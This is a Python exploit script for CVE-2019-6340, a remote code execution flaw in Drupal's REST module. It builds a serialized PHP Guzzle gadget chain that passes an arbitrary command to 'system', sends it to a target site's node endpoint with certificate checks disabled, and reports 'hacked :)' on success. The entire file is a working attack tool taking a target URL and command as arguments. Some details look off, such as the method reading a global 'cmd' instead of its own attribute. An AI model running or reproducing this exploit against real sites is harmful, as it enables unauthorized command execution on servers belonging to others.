import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

class CVE2019_6340:
    headers = {"User-Agent" : "application/hal+json"}
    
    def __init__(self, url, node, cmd):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url, self.node = url, node
        self.cmd = cmd
        self.session = requests.Session()

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        options = "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000"
        options += "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\""
        options += "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"
        options += "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"
        options += "s:{}:\"{}\";".format(str(len(cmd)), cmd)
        options += "s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000" 
        options += "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000"
        options += "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\""
        options += "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
        payload = {
        "link": [
            {
                "value": "link",
                "options": options,
            }
        ],
        "_links": {
            "type": {
                "href": self.url.rstrip("/") + '/rest/type/shortcut/default',
                }
            }
        }
        
        url = self.url.rstrip("/") + '/node/{}?_format=hal_json'.format(self.node)
        r = self.session.get(
            url, 
            headers = self.headers, verify = False, allow_redirects = False, json = payload
        )
        print (LogColors.YELLOW + "request: " + url + "..." + LogColors.ENDC)
        if r.ok:
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to send payload :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-n','--node', required = True, help = "node")
    parser.add_argument('-c','--cmd', required = True, help = "command")
    args = vars(parser.parse_args())
    url, node = args['url'], args['node']
    cmd = args['cmd']
    cve = CVE2019_6340(url, node, cmd)
    cve.exploit()

